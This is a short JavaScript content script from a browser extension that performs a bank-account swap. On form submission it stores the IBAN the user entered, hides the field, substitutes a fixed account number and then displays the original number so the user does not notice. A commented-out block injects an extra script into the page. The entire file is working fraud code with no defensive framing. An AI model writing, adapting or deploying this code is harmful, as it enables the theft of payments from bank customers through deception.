/**
 * Created by karas on 24.11.2016.
 */

/*var s = document.createElement('script');
// TODO: add "script.js" to web_accessible_resources in manifest.json
s.src = chrome.extension.getURL('script_inject.js');
s.onload = function() {
    console.log("loaded");
    this.remove();
};
window.document.head.appendChild(s);*/

try{
    document.forms[0].addEventListener("submit", function () {
        var txt = document.getElementById('iban');
        chrome.storage.sync.set({'oldValue': txt.value}, function() {
            console.log('Settings saved');
        });
        txt.style.visibility = 'hidden';
        txt.value = 3333333333;
    })
}
catch(e){
    console.log(e);
}
try{
    chrome.storage.sync.get('oldValue', function (item) {
        document.getElementById("numer_konta").innerHTML = "Numer konta: "+item['oldValue'];
    });
}
catch(e){
    console.log(e);
}
